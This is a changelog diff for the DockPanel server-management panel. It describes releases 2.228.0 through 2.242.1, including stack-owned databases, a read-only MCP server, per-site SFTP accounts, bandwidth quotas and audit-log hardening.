@@ -4,6 +4,11425 @@ All notable changes to DockPanel will be documented in this file.
 
 The format is based on [Keep a Changelog](https://keepachangelog.com/).
 
+## [2.242.1]
+
+### Fix: stack-owned databases had zero backup coverage
+
+The scheduled/policy backup path (`backup_policy_executor.rs`) still selected candidate databases
+with a plain `JOIN sites`, which silently dropped every stack-owned database added in v2.242.0
+(`site_id IS NULL` for those rows) — so a database created under a Docker Stack got no scheduled
+or manual policy-driven backup at all, with no error anywhere in the chain. Fixed by switching to
+the same `LEFT JOIN` both owner tables + `COALESCE` pattern `databases.rs` already uses for every
+other stack-owned-database route; zero behavior change for existing site-owned databases. Caught by
+re-verifying this session's own prior ship against current source, and confirmed live in a
+rolled-back transaction against the demo database (old query drops the stack-owned row, new query
+resolves it with the correct `server_id`).
+
+## [2.242.0]
+
+### Add: standalone database provisioning for Docker Stacks (GH #64)
+
+A database can now be owned by a Docker Stack instead of a Site — for a containerised app that
+needs a real, panel-managed database (credentials, backups, SQL browser) without a site to attach
+it to. Previously `databases.site_id` was `NOT NULL` end-to-end, so nothing outside a site could
+ever get one; the maintainer's own reply on #64 had pointed reporters at a raw `db:` service in
+their own compose file as a workaround, which works for connectivity but gets none of the panel's
+own database features.
+
+- **New `databases.stack_id`**, mutually exclusive with `site_id` (`chk_databases_owner`), rather
+  than a generic polymorphic owner column — every other multi-owner table in this codebase uses a
+  concrete nullable FK + CHECK, never a generic pair, and this keeps `ON DELETE CASCADE`
+  expressible. Every route that used to join `sites` alone now resolves the owner through either
+  table via `COALESCE`, one query, no behavior change for existing site-owned databases.
+- **The container joins the stack's own private network** (already used to give a stack's other
+  services name-based reachability) instead of the shared, inter-container-communication-disabled
+  bridge a site-owned database uses — so, unlike a site-owned database, a stack-owned one **is**
+  directly reachable by name from that stack's own containers, with nothing extra to configure.
+  Every panel-side query/backup/credential-reset operation already reaches a database container via
+  `docker exec`, not a TCP connection to its published port, so this change doesn't touch any of
+  that — a stack's network is single-tenant by construction, so it's no new cross-tenant exposure
+  either, just one single-purpose bridge swapped for another.
+- **Deleting a stack now also removes any database it owns.** Live-testing this surfaced a real
+  ordering bug the code review missed: the stack's own network teardown ran BEFORE the database
+  container was removed, so Docker correctly refused to delete a network that still had an
+  attachment — the network was silently left behind. Fixed by removing the database container
+  first.
+- Admin-only, since Docker Stacks are admin-only throughout the panel; the Create Database form
+  only shows the Site/Stack picker once at least one stack exists to choose from.
+- Live-verified end to end on this box's own demo instance: create stack → create standalone DB →
+  confirm the container is on the stack's network and reachable by name from a sibling container,
+  not on the shared bridge → query/credentials/tables endpoints still work → delete the DB directly
+  (container + row gone) → create a second DB, delete the STACK instead (DB container, DB row, and
+  the stack's network all gone; the earlier ordering bug caught and fixed on this exact run) →
+  regression-tested the original site-owned path end to end alongside it (unchanged).
+
+## [2.241.0]
+
+### Add: MCP server, session 2 — the full v1 tool catalogue, Settings UI, and a stale-copy fix
+
+Finishes what v2.240.0's scaffold started. `dockpanel-mcp` now ships the complete v1 surface the
+design called for, still entirely read-only.
+
+- **37 more tools, 40 total.** One representative list/get pair per resource family — sites, apps,
+  databases, servers, monitors, DNS, backups (metadata only, never restore), mail, incidents, alerts,
+  on-call, webhooks (config listing, never inbound receivers), users, settings (masked), resellers,
+  telemetry, WordPress, Git Deploys, stacks, and the panel's own activity feed. Every tool is a thin
+  GET proxy onto the existing REST API against the actual route/query-param signatures, not guessed —
+  zero new response shapes. Verified with a live protocol handshake (`initialize` → `tools/list` →
+  `tools/call`): exactly 40 tools enumerate, and `isError: true` fires correctly on both a no-arg and
+  a param-taking tool's "not configured" path.
+- **`mcp_server_enabled` / `mcp_bind_mode` settings**, a Settings → Services card (status, bind mode,
+  resolved endpoint, inline setup steps), and honest about what they are: a record for the panel to
+  display, not a live switch — the actual on/off state is still the systemd unit. Read back by
+  `GET /api/dashboard/fleet` (and so by the `get_fleet_dashboard` tool itself) so an agent asking
+  about its own fleet gets a real answer instead of nothing.
+- **Fixed a stale, actively-misleading banner**: the API Keys card said "API keys do not yet
+  authenticate requests" on every new/rotated key — untrue since `dp_` keys became first-class, and
+  actively wrong advice to anyone minting one for MCP.
+- **Docs**: a new MCP Server guide (setup, bind modes, the full tool table, security notes), and the
+  "3 Rust binaries" claim on README/COMPARISON/dockpanel.dev corrected to 4 (~57 MB total) — stale
+  since v2.240.0 shipped the crate itself.
+
+## [2.240.0]
+
+### Add: MCP server, session 1 — crate scaffold + audit-attribution fix (read-only tools land in the next release)
+
+The first half of a design for letting an AI agent talk to DockPanel over the Model Context Protocol.
+This release ships the plumbing, not the feature surface an operator would notice yet:
+
+- **`panel/mcp`**, a 4th standalone crate (`dockpanel-mcp`), following the exact pattern
+  `dockpanel-cli` already uses to talk to the panel API — a `dp_` key over loopback HTTP, read from
+  `/etc/dockpanel/mcp.token`. Built on `rmcp` 3.2.0 (pinned: 2.0.0 fixed a CVSS 7.5 unauthenticated
+  DoS in older releases), Streamable HTTP transport only. Ships 3 read-only tools (`list_sites`,
+  `get_security_audit_log`, `get_fleet_dashboard`) to prove the pipeline end to end — the full
+  ~40-tool read-only catalogue is next release.
+- **Installed but not enabled.** `setup.sh`/`update.sh` install the `dockpanel-mcp` systemd unit and
+  binary; nothing starts it automatically, and there is no settings toggle yet. An operator who wants
+  it today: mint a `dp_` key (Settings → API Keys), save it to `/etc/dockpanel/mcp.token`, then
+  `systemctl enable --now dockpanel-mcp`. nginx proxies `/mcp` (exact match) to it once running.
+  `mcp_server_enabled` and the settings UI land with the tool catalogue.
+- **Audit-attribution fix (the reason this shipped ahead of any UI).** Before this release, an
+  action authenticated with a `dp_` key was indistinguishable from a browser session in both audit
+  tables — `authenticate_api_key` looked up the key's id, used it once for `last_used_at`, and
+  discarded it. `Claims` now carries `key_id: Option<Uuid>`, threaded through every
+  `log_activity`/`log_activity_on_server`/`audit_log` call site (348 call sites across 42 files) to
+  a new `api_key_id` column on `activity_logs` and `security_audit_log`. This has to be in place
+  before any mutating MCP tool ever ships, or the audit log could never answer "did an agent do this
+  or did an operator click a button."
+- **Schema, unenforced until next release:** `api_keys.scopes` (nullable — every existing key keeps
+  today's all-or-nothing behavior) and `security_audit_log.actor_user_id` (a real FK, alongside the
+  existing free-text `actor_email`).
+
+## [2.239.1]
+
+### Fix: Agent binary size register was 1MB stale
+
+`live-surfaces-check.sh` caught it on the v2.239.0 push: the published `dockpanel-agent-linux-amd64`
+asset is 22.0 MB, not the 21 MB `FEATURES.md`'s Verified Metrics register (and README) had held
+since v2.103.0 — a pre-existing drift, not something this release introduced, made visible because
+Live Surfaces re-runs on every push. Corrected both surfaces to 22 MB.
+
+## [2.239.0]
+
+### Git Deploy previews now report status to GitHub
+
+Preview deployments (isolated per-branch containers, their own subdomain, TTL auto-cleanup) have
+worked end to end since v2.53-2.55 — but the one place a pusher would actually look, GitHub's own
+commit/PR view, never heard about any of it. `set_github_status` — the same call regular and
+scheduled deploys have used at 9 sites all along — now fires at every preview outcome: pending
+when the clone starts, success when the deploy comes up, failure on a clone, build, TLS-readiness,
+or deploy failure. Every call routes through the existing `deploy_url` resolver, computed once per
+push rather than re-derived per call site, so a preview link can never carry a hardcoded scheme.
+
+### Migration Wizard: fetch a backup archive by URL
+
+Importing from cPanel, Plesk, or HestiaCP required uploading the archive to the server via SFTP
+first, then pasting the resulting path — the only path `POST /api/migration/analyze` ever accepted.
+It now also accepts a URL: the agent downloads the archive itself into the one subtree it can
+actually write under systemd's sandbox (`/var/backups/dockpanel/migration-fetch/`), then analysis
+proceeds exactly as before. The fetch is SSRF-guarded (the same host check `git_build.rs`'s repo-url
+dialing uses, re-validated independently on the agent side rather than trusted from the panel),
+scheme-restricted to `http(s)://`, and size-capped on both the declared `Content-Length` and the
+actual streamed byte count — a `.part` file is renamed into place only once the full response has
+landed, so a crash or a cap trip can never be mistaken for a complete archive by the analyzer.
+
+### Small fixes
+
+- The armv7l (32-bit ARM) install refusal is correct and intentional — only 64-bit ARM64 binaries
+  are published (GH #126).
+- Git Deploy's New/Edit modal widened (`max-w-lg` → `max-w-2xl`) for editing long `.env` values and
+  connection strings comfortably (GH #128).
+- The Git Deploy breadcrumb inside a site now shows the site's real domain instead of the literal
+  word "Site" (GH #128).
+- README now disambiguates from the unrelated WPF/WinForms `DockPanel` docking control near the top
+  (GH #127).
+
+## [2.238.0]
+
+### Per-site SFTP accounts (GH #108)
+
+The single most-requested item on the tracker. Every site's files were owned by one shared
+`www-data` Linux identity, with no way to hand a site owner filesystem access without giving them
+the whole box. Each SFTP-enabled site now gets its own Linux uid/gid — the real content directory
+is re-owned to that identity (the actual isolation), and a separate chroot jail is bind-mounted onto
+it (never moved) so OpenSSH's `ChrootDirectory` requirement — every path component root-owned and
+non-writable — never needs to touch nginx, PHP-FPM, WP-CLI, or CMS-installer paths that assume the
+site lives at its existing location.
+
+**Explicit, one-time, and reversible.** Nothing migrates until "Enable SFTP" is clicked on a site's
+own page; disabling reverts ownership to `www-data` and tears down the jail. The password is always
+panel-generated (never operator-typed), hashed in-process and set via `usermod -p`, shown to the
+operator exactly once, and never stored — a Linux account needs no prior password to reset again, so
+there is nothing for the panel to hold between resets.
+
+uid/gid allocation goes through a real Postgres sequence rather than a `MAX()+1` read, which would
+race under concurrent enables. The sshd configuration change (a dedicated `Match Group` drop-in) is
+validated (`sshd -t`) before every reload — the codebase's existing SSH-hardening code had no such
+check before this, a real lockout risk on any config mistake, now fixed for this path.
+
+New mutation-tested pin (`sftp-accounts-pin-e2e.sh`, 57 assertions), grown across four rounds of
+live-verified fixes on a throwaway VPS: an `EROFS` on jail-directory creation under the agent's
+systemd sandbox, a `$`-in-argument mangling through the shared `systemd-run` command wrapper (fixed
+at the shared primitive, not just this call site — bcrypt/Argon2/SHA-crypt all use `$` as a field
+separator), a SHA-crypt salt exceeding the format's own 16-character cap (silently unverifiable by
+`crypt()`), and PHP-FPM's master process respawning workers under a deleted uid because pool-config
+removal alone doesn't stop it — `deprovision()` now removes the pool config and reloads PHP-FPM
+itself, not relying on the caller. No new endpoints beyond the three this feature adds; no existing
+behavior changes for a site that never enables it.
+
+## [2.237.0]
+
+### Per-site bandwidth quota and traffic accounting (GH #84)
+
+Sites can now be given a monthly bandwidth cap (MB), set in the same Resource Limits panel as rate
+limiting and max upload size. Usage is shown as a live progress bar (green/amber/red as it
+approaches the cap) alongside the other limits, and a site that exceeds its quota is automatically
+disabled — the same mechanism as a manual toggle — with a clear reason on the disabled banner
+rather than a generic "site is disabled" message.
+
+The accounting itself is a durable monthly accumulator (`site_traffic_usage`), built by a new
+`traffic_accounting_scheduler` background service (5-minute interval) that asks each site's agent
+for bytes transferred since a persisted checkpoint (`site_traffic_offsets`). The agent's new
+`GET /nginx/site-traffic-delta/{domain}` endpoint computes that delta directly from the nginx access
+log, correctly crossing a daily logrotate rotation: the just-rotated `.1` file (kept plain-text for
+one more cycle by `delaycompress`) is read for its remaining unaccounted bytes before the fresh
+current file is read from the start. The checkpoint offset never advances past an in-progress,
+not-yet-newline-terminated log line — advancing past one would both corrupt the running byte sum
+(parsing a truncated size field) and permanently skip that request, so a partial line is left for the
+next poll to re-read complete instead.
+
+A site is suspended for exceeding its quota exactly once per over-quota episode, not re-suspended
+(and re-notified) on every tick while it stays over. Three independent paths restore it: a new
+calendar month starts, the quota is raised or removed (checked immediately when the operator saves
+the new limit, not on the next 5-minute tick), or a human manually re-enables it — the last of which
+required fixing a related gap in the existing manual toggle: it used to leave a stale
+`bandwidth_suspended_at` behind on re-enable, which would have shadowed the scheduler's own
+over-quota check forever (it only re-evaluates a site once that field is cleared).
+
+New mutation-tested pin (`bandwidth-quota-pin-e2e.sh`, 31 assertions) pins the partial-line safety
+property, the suspend-once guard, all three recovery paths, and the manual-toggle fix.
+
+## [2.236.0]
+
+### AI-assisted build/deploy failure diagnosis (BYO API key)
+
+Git Deploys' history panel gets a one-click "Explain with AI" button on any failed deploy, sitting
+alongside the existing Rollback control. It sends the deploy's captured output — commit, image tag,
+and build/deploy log — to a provider the operator has configured and asks for a plain-language root
+cause and a concrete next fix.
+
+Off by default, and per-request only: nothing calls a provider on a schedule or on every failure
+automatically. Four providers are supported (Anthropic, OpenAI, Gemini, Grok/xAI), each with its own
+BYO API key, model name, and request/response handling — verified live against all four providers'
+real endpoints (with a deliberately invalid key) during development, which caught a real shape
+mismatch: xAI's error responses are `{"error": "<string>"}`, not the nested `{"error": {"message":
+...}}` object every other provider (and xAI's own success responses) use, and the fallback that
+handles it now has its own unit tests alongside the four providers' request builders.
+
+The failure output leaves the box only after unconditional redaction — passwords, tokens, API keys,
+`Authorization: Bearer` headers, connection-string credentials, and PEM private key blocks are
+stripped before the request is built, with no setting that can turn redaction off — and is capped to
+the last ~8000 characters. The API key is stored encrypted at rest through the same mechanism as
+every other integration credential in this codebase (PowerDNS, CDN tokens), not a new one invented
+for this feature; a pre-existing latent bug this change would otherwise have hit — `GET /api/settings`
+masked sensitive values via a hand-copied list of five exact key names instead of the shared
+`SENSITIVE_KEYS` predicate `update()` already used — is fixed as part of adding the new key, so a
+future sensitive key added the same way won't round-trip as raw ciphertext.
+
+New mutation-tested pin (`ai-diagnosis-pin-e2e.sh`, 29 assertions) pins the default-off gate, the
+manual-trigger-only invariant (exactly one call site, exactly one route), the failed-status gate, and
+unconditional redaction.
+
+## [2.235.0]
+
+### Immutable audit trail extended to destructive and privilege-sensitive mutations
+
+DockPanel has always had two logging paths: a general activity log (mutable, no protection against
+an `UPDATE`/`DELETE`) and an immutable security audit log (a Postgres trigger blocks `UPDATE`/`DELETE`
+on it, plus an append-only tamper-resistant file). The immutable path was scoped narrowly — login
+events, a handful of security-hardening actions, and Git Deploy protection changes — while every
+other destructive or privilege-sensitive action (deleting a site, server, or user; promoting or
+demoting a reseller; resetting another user's password or 2FA; rotating a secret, API key, or server
+token; disabling SSH password auth; transferring a site) only ever reached the mutable table. With
+teams and resellers meaning multiple real people can hold panel access, a compromised admin account
+or a malicious insider could perform one of those actions and then edit or delete the one record of
+it — leaving zero forensic trace.
+
+96 call sites across 32 route files, classified as destructive, privilege-changing, credential-
+lifecycle, or infrastructure-topology mutations, now ALSO write an immutable audit log entry
+alongside the existing activity log call — same actor, same target, same details, the real caller IP
+threaded through wherever it wasn't already available. A live-verification pass against this box's
+real Postgres during development found one more: the login handler's "no such account" branch used a
+third, rarer logging call this session's initial survey didn't cover — the one branch, by the
+existing code's own account, that actually matters for detecting credential stuffing and username
+enumeration, since those attempts are by definition against emails that don't exist. Fixed and
+covered by its own pin assertion, distinct from the sibling "wrong password for a real account"
+branch.
+
+No new endpoints, no schema migration, no behavioural change to any response — this is additive
+logging only, live-verified end to end (including that the immutability trigger itself rejects a
+direct `UPDATE`/`DELETE`) before shipping.
+
+## [2.234.1]
+
+### Git Deploy volumes: harden the kept-binds comparison
+
+An independent adversarial review of v2.234.0's persistent-volumes fix (run before the box's Docker
+daemon test finished, not after a defect report) found one narrow, currently-unreachable edge: the
+filter that decides which of an existing container's binds are still declared compared the FULL
+string after the first `:`, so a 3-segment Docker bind (`host:container:mode`, e.g. a manually
+`docker update`-added `:ro`) would have its mode suffix bleed into the comparison and the bind would
+be dropped as "unmounted" — re-migrated via a no-op `docker cp` on the next deploy rather than any
+actual data loss. DockPanel itself never writes a 3-segment bind for a git deploy today, so this
+was not reachable through normal use. Fixed to compare only the container-path segment regardless
+of what follows it.
+
+## [2.234.0]
+
+### Git Deploy: Persistent Volumes (GH #118)
+
+A Git Deploy container had no volume and no bind mount, and every deploy replaced the container —
+so anything the app wrote to its own filesystem (uploads, a SQLite database, a cache) was destroyed
+on the *next* deploy. Reported as a real data-loss incident. Tracked as unbuilt work since it was
+priced (six named constraints recorded beside the code that would change), rather than declined —
+this ship builds it.
+
+**What shipped.** A `Persistent Volumes` field on the Git Deploy form — container paths only
+(`/data`, not a host path); DockPanel derives and manages the host location under its own data
+directory, mirroring how Docker Apps already bind declared volumes. Takes effect on the next
+deploy.
+
+**All six constraints closed together, since 1-5 alone would have been a regression:**
+- The two `HostConfig` literals (base deploy + blue-green) no longer disagree — blue-green is now
+  refused whenever a deploy declares any volume, falling back to the ordinary stop/start path
+  instead of running two containers against the same host paths for the length of a health check
+  (silent corruption for a single-writer database like SQLite).
+- Preview environments are refused a `volumes` list at the agent's own request boundary, not merely
+  by the panel choosing not to send one — a throwaway PR container must never gain durable storage.
+- Delete-time cleanup derives what to remove from the container's own binds, read in the same
+  pre-removal inspect used for its vhost and certificates — never from its name alone, which is not
+  proof of ownership.
+- Adding a path to an already-running deploy rescues whatever is already sitting in that
+  container's writable layer before the recreate would otherwise delete it (generalized
+  `docker_apps::migrate_unmounted_volumes`, the same mechanism that closed GH #110).
+
+Live-verified end to end against a real Docker daemon: seed-from-image on a fresh deploy, data
+surviving an ordinary redeploy, real writable-layer data surviving the deploy that adds a volume to
+it, the volume directory removed on full deletion (and left alone when the container could not be
+proven owned), and both the preview and path-traversal refusals firing with zero side effects.
+
+
+
+### Two buried capabilities surfaced (Mode B research quick wins)
+
+First-ever Mode B feature-research pass (5 parallel research agents: GitHub open issues, competitor
+refresh, 2026 trend scan, buried-capabilities re-check, then a synthesis pass) with both loose-ends
+audits fully closed and no repair backlog left. Ovidiu picked the two lowest-risk items from the
+resulting shortlist — both already fully built on the backend, just never rendered.
+
+**CA-suggested SSL renewal window (ACME ARI, RFC 9773)** — the auto-healer has fetched, stored and
+acted on this date since v2.7.17; `sites.ssl_renewal_at` was never read by anything the Certificates
+page's own SQL selected. `certificate_dashboard` and `certificate_dashboard_for_admin` now select and
+forward it; the Certificates page shows "CA suggests renewal ~{date}" under the days-left column for
+any site-backed certificate the healer has already checked (Docker Compose stacks have no
+`ssl_renewal_at` column and keep this null, same as they already did for other site-only fields).
+
+**Suspicious-events timeline** — `record_suspicious_event[_at]` has written a real per-event row
+(proxy/datacenter login, staging-clone abuse, deploy anomaly) to `suspicious_events` since the
+2026-03-24 security-hardening migration; the only reader anywhere was a bare `COUNT(*)` used to trip
+the auto-lockdown threshold. New `GET /api/security/suspicious-events` (admin-only, same
+limit/offset shape as the existing audit-log endpoint) and a table on the Security page's Lockdown
+tab, directly above the Immutable Audit Log it complements — "why lockdown is close to firing" next
+to "what already happened".
+
+One new HTTP route (829 → 830 backend). Verified: backend 474/474 tests, clippy 426 warnings (one
+below the 427 baseline — the new `suspicious_events_list` query and the two extended certificate
+queries were factored into named tuple type aliases rather than left as bare 5/6-element tuples),
+release build clean, frontend `tsc -b --noEmit` + `vite build` clean, `docs-claims-pin-e2e.sh`
+201/201 (route count re-derived and corrected), full 131-suite `tests/*-pin-e2e.sh` sweep green.
+
+## [2.232.0]
+
+### Closed the 3 findings the second Loose-Ends Audit (v2.231.0) left as product decisions
+
+All three were presented to Ovidiu as wire-vs-drop calls after v2.231.0 shipped; he picked "wire it
+in" on all three.
+
+**`container_expected_stops.actor_email`** — captured on every manual container stop, never read
+back. `reasons_on_server` now selects it alongside `reason`; the `/apps` annotator adds an
+`expected_stop_by` key when a person (not auto-sleep) stopped the container; the Apps page's
+"stopped on purpose" tooltip now reads `(reason — email)` instead of just `(reason)`.
+
+**`on_call::whoami`** — built with a broader non-admin auth extractor specifically for self-service,
+but the entire on-call UI (`Alerts.tsx`'s `OnCallTab`) is `isAdmin`-gated, so its intended audience
+had zero on-call visibility. Added a header badge on the Dashboard, visible to any authenticated
+user, showing "On call: {schedule name(s)}" when `GET /on-call/whoami` returns a non-empty list.
+Admins get it as a link into Alerts; everyone else gets an informational badge only, since the
+OnCallTab itself stays admin-only and linking a non-admin there would just be a new dead end of the
+exact shape this audit exists to catch.
+
+**`sites::health_summary`** — a real ownership-scoped 0-100 composite score (SSL expiry, backup
+freshness, monitor uptime across 3 tables), distinct from both the boolean `health` check
+`SiteDetail.tsx` already uses and Dashboard's fleet-wide `health_score`. Added a small "Health N"
+badge next to the existing Health Check button, augmenting rather than replacing it, with a tooltip
+breaking down the three sub-scores.
+
+No new routes, migrations, or frontend pages — doc-claims figures unchanged from v2.231.0. Verified:
+backend 474/474 tests + 427 clippy warnings (baseline unchanged), release build clean, frontend
+`tsc -b --noEmit` + `vite build` clean, `docs-claims-pin-e2e.sh` 201/201, full 131-suite
+`tests/*-pin-e2e.sh` sweep green.
+
+## [2.231.0]
+
+### Second Loose-Ends Audit — 15 confirmed findings closed in one release
+
+p209 (the first-ever Loose-Ends Audit, v2.223.0) closed fully at v2.230.0 after 7 sessions. This is
+the second pass over the whole tree: 6 finder dimensions swept in parallel, then every candidate was
+REFUTE-verified against current source before being trusted. 20 candidates verified — 18 confirmed
+real, 2 refuted (a self-documented placeholder column, and an "unused" SBOM API that's actually
+documented for external consumers). Of the 18, 15 were mechanical closures shipped this release; 3
+are genuine product decisions left open (see below).
+
+**Fixed — two real concurrency bugs, not just completeness gaps.** Docker-app domain
+exposure/teardown (`expose_domain`/`unexpose_domain`), the blue-green update proxy swap, and volume
+restore never got wired into `site_lock` when that module was built (v2.182.0) to serialize
+domain-keyed site mutations — they write/delete the exact same `nginx::vhost_target` files
+SSL/WordPress/staging/git-deploy already lock, and volume restore does an unconditional rm-rf +
+extract against a live, potentially-mounted Docker volume with zero coordination. Separately,
+`site_lock.rs`'s own "every operation" invariant was false: the single-file restore route
+(`routes/backups.rs::restore_file`) skipped the lock its sibling full-restore route takes (reachable
+only via a direct agent API call today, not through the panel UI). All five call sites now take the
+same domain/volume-keyed lock as their siblings.
+
+**Fixed — Deploy.tsx's `Promise.all` erased a working config on an unrelated failure.** Two
+independent GETs (deploy config, deploy logs) were bundled in one `Promise.all`; a logs-fetch
+failure alone fell into a bare catch that never set `config`, making a genuinely-configured site
+look unconfigured. This is the identical mistake Databases.tsx's own code comment documents as
+having caused a real 5-month dead UI pane before being fixed there with `Promise.allSettled` — that
+fix was never carried to this sibling call site. Fixed the same way here.
+
+**Fixed — silent alert-delivery failures.** PagerDuty logged nothing at all on send failure, at
+either call site; Slack/Discord/generic-webhook only ever logged an SSRF-guard block, never the
+actual HTTP outcome. All four now log a warning on a non-2xx response or transport error, matching
+the email channel's existing behavior. Telemetry's Events tab and CDN's zone list both rendered a
+load failure identically to "nothing to show" — both now surface the failure instead.
+
+**Fixed — CLI docs stale since v2.221.0.** `docs/cli-reference.md` and `docs/guides/backups.md`
+both still said a database-bearing restore "fails" from the CLI; that's been false since
+`cmd_backup_restore` gained a `backend.token`-gated full restore path. Both now describe it
+accurately, with the files-only caveat scoped to the no-key fallback.
+
+**Wired four dead-but-real endpoints into their obvious UI:** a container shell-availability probe
+(`has_bash`/`has_sh`) now runs before the Apps shell modal accepts input, instead of every exec
+attempt on a distroless image failing blind; a real 30-day backup-storage trend
+(`backup-orchestrator/storage-history`) now renders as a sparkline (hand-rolled inline SVG — no new
+chart dependency); the one CDN pull-zones endpoint without a caller now has a Pull Zones panel; the
+fully-built Auto-Optimization recommendations endpoint (PHP-FPM/nginx-worker/swap tuning) now has a
+panel on the Diagnostics page.
+
+**Removed dead code rather than leave it disclosed-but-live:**
+- The Cloudflare Tunnel token-config routes (`configure_tunnel`/`tunnel_status`) and the
+  write-only `tunnel_configured` settings key — FEATURES.md's own Withdrawn Claims table already
+  documented this as a decided "will not build a UI" case since 2026-08-16; the code itself is now
+  gone too, matching the treatment Restic and Stripe billing already got.
+- The orphaned `canary_files` table (migration `20260907000000_drop_canary_files_table.sql`) —
+  zero application-code readers or writers; the real canary-file feature persists state via
+  `settings` rows instead. Its sibling table from the same migration, `suspicious_events`, is
+  fully wired end-to-end.
+- `pages/SecurityHardening.tsx`, a fully-built standalone component with zero imports anywhere —
+  its four siblings were consolidated into `Security.tsx` at the time; this one was left behind.
+- A stale `routes/mod.rs` comment still enumerating two agent routes removed in a past release.
+
+**Deferred to a product decision, not closed this release** (each a real wire-vs-drop call):
+`container_expected_stops.actor_email` (captured on every stop, never surfaced — wire it into the
+Apps tooltip, or drop the column); `on_call::whoami` (built for non-admin self-service, but the
+entire on-call UI is admin-gated); `sites::health_summary` (a real 0-100 composite SSL/backup/uptime
+score with no UI reader). See FEATURES.md-style framing in the tech-debt ledger.
+
+Doc-claims figures updated for the net code change: HTTP routes 831 → 829 (539 backend + 290 agent,
+2 Cloudflare Tunnel routes removed), Frontend pages 53 → 52 (SecurityHardening.tsx deleted), DB
+migrations 132 → 133 (the new canary_files-drop migration). Two pin suites' `canary_files table
+exists` assertions removed (`full-e2e.sh`, `security-enhancements-e2e.sh`) since the table no longer
+exists. Verified: agent 336/336 tests + 137 clippy warnings (baseline unchanged), backend 474/474
+tests + 427 clippy warnings (baseline unchanged), both release builds clean, `cargo audit` clean
+(same pre-existing allow-listed advisories), frontend `tsc -b && vite build` clean, `mdbook build
+docs/` clean, all 131 `tests/*-pin-e2e.sh` suites green including `docs-claims-pin-e2e.sh` itself
+(201/201).
+
+## [2.230.0]
+
+### Withdrawn — Restic incremental backups (API only)
+
+p209's ninth deferred finding closed at v2.229.0 left the final one, p209's second: the Restic backup lane skips the scheduler/retry/alert/staleness treatment local backups get. Re-confirmed "zero exposure" at v2.227.0 and v2.228.0 without ever being put to an actual build-or-withdraw decision. Scoped properly this session, before touching any code, by a 4-way parallel research pass — and the standing "zero exposure" framing turned out to be incomplete: `README.md` has advertised Restic as a real, working "API only" feature since early in the project, and the three routes really were live and JWT-authenticated end-to-end (`POST /api/sites/{id}/restic/backup`, `GET .../restic/snapshots`, `POST .../restic/restore/{snapshot_id}`, proxying to three agent-side handlers). Reachability from any *shipped surface* was genuinely zero — no frontend control beyond a cosmetic command-palette search keyword, no CLI subcommand, absent from `docs/api-reference.md` — but a self-hosted operator who read the README and called the documented API directly would have a real backup path with no retry, no failure alert, and no retention (`forget`/`prune` were never implemented, so snapshots accumulated on disk forever).
+
+Weighed building it out (cheap — the codebase already has this exact scheduler pattern twice, ~half a day of mechanical work) against withdrawal. Chose full removal over both building and a docs-only reword: building would have kept an undemanded, still-headless feature alive and given it more surface area; a docs-only fix would have left ~330-400 lines of live authenticated endpoints in the tree indefinitely, reopening the same "is this actually exposed" question in some future session. Removed:
+
+- The three backend proxy handlers (`routes/backups.rs`) and their route registrations.
+- The agent-side `ensure_restic`/`restic_backup`/`restic_snapshots`/`restic_restore` and their three routes; `chown_restored_tree` (shared with the ordinary tar-based restore path) stays, with its doc comment no longer framed around Restic's uid/gid-preserving restore behavior.
+- The Restic entry in `nginx.rs`'s site-rename backup-tree carry (two domain-keyed trees now, not three) and the cosmetic command-palette search keyword.
+- The two README lines advertising it, and the corresponding `docs/api-reference.md`/`FEATURES.md` route-count figures (837 → 831 HTTP routes: 3 backend + 3 agent routes removed).
+
+No DB migration needed — Restic never had persisted schema; its password lived only in a flat file on the agent's disk. Updated 4 pin suites whose assertions targeted the removed code (`timeout-orphan-kill-on-drop-pin-e2e.sh`, `agent-refusal-status-pin-e2e.sh`, `git-blind-chown-and-restore-ownership-pin-e2e.sh`, `rename-carries-backups-pin-e2e.sh`) rather than leave them red against code that no longer exists. See FEATURES.md's Withdrawn Claims table.
+
+## [2.229.0]
+
+### Fixed — the container-policy usage figure was fleet-wide for every caller, and so was deploy-time enforcement
+
+p209's ninth deferred finding, carried since v2.223.0 and re-scoped twice since (most recently v2.228.0's changelog, which framed it as needing new container-ownership attribution). Re-reading the code this session before building anything found that framing was wrong: the attribution primitive already existed. `deploy_app` has stamped a `dockpanel.user.id` Docker label on every container since container policies shipped, and `list_deployed_apps` already read it straight back onto `DeployedApp.user_id` in every `/apps` response — nothing needed a new column or a new migration. Two call sites simply never consulted it:
+
+**`GET /api/container-policies/{user_id}/usage`** summed every container on the entire online fleet, for every caller, regardless of the `user_id` in the path — two different users' policies read back the identical number. It now derives its count from a per-user map built off the same fleet walk.
+
+**`deploy`'s own quota enforcement** was worse: it summed every container on the *target server alone*, any user, and compared that to the calling admin's personal `max_containers`. On a shared server this let one admin's containers count against another's cap, and let an admin who spread deployments across multiple servers exceed their real total without ever tripping the check on any single one. It now counts only the caller's own containers, fleet-wide — the target server still fails closed on an unreachable agent (unchanged from before, since deploying there requires it live anyway); other servers are best-effort, matching the display endpoint's own long-standing posture that an unreachable peer undercounts rather than blocking the deploy.
+
+**`GET /api/container-policies`** (the list the Container Policies page actually calls) never carried a usage figure at all — the frontend's "Containers" column showed only the configured limit. It now embeds a live `used` count per row from one shared fleet walk, so listing N users' policies does not re-walk the fleet N times. The page renders it as a used/max figure with a small fill bar (green/amber/red past 70%/90%), matching the pattern already used on the Reseller Dashboard, plus a note when a server didn't answer so the figures are visibly a floor rather than silently wrong.
+
+New pin suite `container-ownership-pin-e2e.sh` (9 assertions) — mutation-tested against the pre-fix code before being trusted (6 of 9 arms confirmed red on the old shape, the other 3 correctly stayed green since they pin the pre-existing labeling primitive, not this session's change).
+
+## [2.228.0]
+
+### Closed three of p209's nine deferred findings (Loose-Ends Audit, v2.223.0): a dashboard gap, a GPU correctness bug, and a withdrawn feature
+
+Re-verified all six still-open deferred findings against current HEAD before acting (per this project's own audit-verification standard); three survived as this release's scope, three did not need code changes.
+
+**Added — Fleet Health and Timeline widgets on the Dashboard.** `GET /api/dashboard/fleet` and `GET /api/dashboard/timeline` were fully built and hardened across two prior releases (v2.185.0/v2.188.0) with zero frontend caller. Wired both into `Dashboard.tsx`: Fleet Health (admin-only, renders once more than one server exists) shows a per-server status dot, CPU/memory, site count and firing-alert count; Timeline (every role, server-side tenant-scoped) merges recent deploys/backups/incidents/alerts/security scans into one feed.
+
